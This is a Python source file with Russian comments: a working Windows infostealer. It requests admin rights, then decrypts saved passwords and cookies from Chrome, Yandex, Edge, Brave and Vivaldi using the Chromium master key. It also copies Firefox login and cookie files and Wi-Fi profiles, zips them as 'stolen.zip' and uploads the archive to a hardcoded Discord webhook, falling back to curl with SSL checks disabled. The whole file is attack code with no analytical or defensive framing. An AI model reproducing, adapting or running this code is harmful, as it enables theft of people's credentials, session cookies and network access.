import os
import sys
import sqlite3
import shutil
import requests
import json
import ctypes
import base64
import glob
import zipfile
import tempfile
import subprocess
import traceback
import time
import urllib3
from pathlib import Path

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

WEBHOOK_URL = "https://discord.com/api/webhooks/1509546233491095733/QGxnrhDV7u5qK28FQrBA6Lv2jp0oEOt9BfXMsFaStJDl6G3FuPr63AEtlmQkShrVoP_H"
TEMP_DIR = tempfile.mkdtemp()
ERROR_LOG = "error_log.txt"

def log_error(msg):
    with open(ERROR_LOG, "a", encoding="utf-8") as f:
        f.write(msg + "\n")

def send_file(filepath):
    """Отправка файла с отключённой проверкой SSL и повторами"""
    for attempt in range(3):
        try:
            with open(filepath, 'rb') as f:
                files = {'file': (os.path.basename(filepath), f)}
                # Отключаем verify=False, таймаут 30 сек
                resp = requests.post(WEBHOOK_URL, files=files, verify=False, timeout=30)
                if resp.status_code in (200, 204):
                    print(f"[+] Файл отправлен, статус {resp.status_code}")
                    return True
                else:
                    log_error(f"Попытка {attempt+1}: статус {resp.status_code}, текст {resp.text}")
        except Exception as e:
            log_error(f"Попытка {attempt+1}: {e}")
        time.sleep(2)
    # Если requests не смог, пробуем через curl
    try:
        subprocess.run(['curl', '-k', '-F', f'file=@{filepath}', WEBHOOK_URL], timeout=30)
        print("[+] Отправлено через curl")
        return True
    except Exception as e:
        log_error(f"Curl не сработал: {e}")
    return False

# --- Дешифровка Chromium ---
try:
    from Crypto.Cipher import AES
    import win32crypt
    CRYPTO_AVAILABLE = True
except ImportError as e:
    CRYPTO_AVAILABLE = False
    log_error(f"Нет Crypto/win32crypt: {e}")

def decrypt_chrome(buff, key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        return ""

def get_master_key(path):
    state = os.path.join(path, "Local State")
    if not os.path.exists(state):
        return None
    try:
        with open(state, 'r', encoding='utf-8') as f:
            local = json.load(f)
        enc_key = base64.b64decode(local["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
    except:
        return None

def steal_browser(name, path, output):
    if not os.path.exists(path):
        return
    print(f"[*] Обработка {name}")
    browser_dir = os.path.join(output, name)
    os.makedirs(browser_dir, exist_ok=True)
    if not CRYPTO_AVAILABLE:
        return
    key = get_master_key(path)
    if not key:
        return
    try:
        login_db = os.path.join(path, "Default", "Login Data")
        if os.path.exists(login_db):
            shutil.copy2(login_db, "temp_db")
            conn = sqlite3.connect("temp_db")
            rows = conn.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall()
            conn.close()
            os.remove("temp_db")
            if rows:
                with open(os.path.join(browser_dir, "passwords.txt"), "w", encoding="utf-8") as f:
                    for url, user, enc in rows:
                        if enc:
                            pwd = decrypt_chrome(enc, key)
                            if pwd:
                                f.write(f"URL: {url}\nUser: {user}\nPass: {pwd}\n\n")
    except Exception as e:
        log_error(f"Ошибка паролей {name}: {e}")
    try:
        cookie_db = os.path.join(path, "Default", "Cookies")
        if os.path.exists(cookie_db):
            shutil.copy2(cookie_db, "temp_cookies")
            conn = sqlite3.connect("temp_cookies")
            rows = conn.execute("SELECT host_key, name, encrypted_value FROM cookies").fetchall()
            conn.close()
            os.remove("temp_cookies")
            if rows:
                with open(os.path.join(browser_dir, "cookies.txt"), "w", encoding="utf-8") as f:
                    for host, cname, enc in rows:
                        if enc:
                            val = decrypt_chrome(enc, key)
                            if val:
                                f.write(f"{host}\t{cname}\t{val}\n")
    except Exception as e:
        log_error(f"Ошибка cookies {name}: {e}")

def steal_firefox(output):
    try:
        ff_dir = os.path.join(output, "Firefox")
        os.makedirs(ff_dir, exist_ok=True)
        profiles = glob.glob(os.path.expanduser("~") + r"\AppData\Roaming\Mozilla\Firefox\Profiles\*.default*")
        for i, prof in enumerate(profiles):
            prof_dir = os.path.join(ff_dir, f"profile_{i}")
            os.makedirs(prof_dir, exist_ok=True)
            for fname in ["logins.json", "cookies.sqlite"]:
                src = os.path.join(prof, fname)
                if os.path.exists(src):
                    shutil.copy2(src, os.path.join(prof_dir, fname))
    except Exception as e:
        log_error(f"Firefox ошибка: {e}")

def steal_wifi(output):
    try:
        wifi_dir = os.path.join(output, "WiFi")
        os.makedirs(wifi_dir, exist_ok=True)
        data = subprocess.check_output("netsh wlan show profiles", shell=True, text=True, timeout=10)
        with open(os.path.join(wifi_dir, "profiles.txt"), "w", encoding="utf-8") as f:
            f.write(data)
    except Exception as e:
        log_error(f"WiFi ошибка: {e}")

def main():
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print("[!] Нет прав, запрашиваем...")
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit(0)
        collect_dir = os.path.join(TEMP_DIR, "stolen_data")
        os.makedirs(collect_dir, exist_ok=True)

        browsers = {
            "Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data",
            "Yandex": os.path.expanduser("~") + r"\AppData\Local\Yandex\YandexBrowser\User Data",
            "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data",
            "Brave": os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data",
            "Vivaldi": os.path.expanduser("~") + r"\AppData\Local\Vivaldi\User Data",
        }
        for name, path in browsers.items():
            steal_browser(name, path, collect_dir)

        steal_firefox(collect_dir)
        steal_wifi(collect_dir)

        archive_path = os.path.join(TEMP_DIR, "stolen.zip")
        with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(collect_dir):
                for file in files:
                    full = os.path.join(root, file)
                    arc = os.path.relpath(full, collect_dir)
                    zipf.write(full, arc)

        send_file(archive_path)
        print("[+] Готово")
    except Exception as e:
        log_error(f"Критическая ошибка: {traceback.format_exc()}")
        print(f"[!] Ошибка: {e}, смотрите error_log.txt")
    finally:
        try:
            shutil.rmtree(TEMP_DIR, ignore_errors=True)
        except:
            pass
        input("Нажмите Enter для выхода...")

if __name__ == "__main__":
    main()